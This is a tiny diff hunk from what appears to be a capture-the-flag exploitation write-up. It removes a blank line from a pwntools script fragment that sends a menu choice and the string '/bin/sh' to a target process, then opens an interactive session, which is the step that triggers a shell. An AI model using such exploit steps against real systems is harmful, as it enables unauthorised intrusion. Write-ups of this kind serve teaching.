@@ -342,7 +342,6 @@ The 3rd/4th jobs are the same, however for the least significant bytes.
 # trigger
 p.sendlineafter(b'> ',b'1')
 p.sendlineafter(b'> ',b'/bin/sh')
-
 p.interactive()
 ```
 
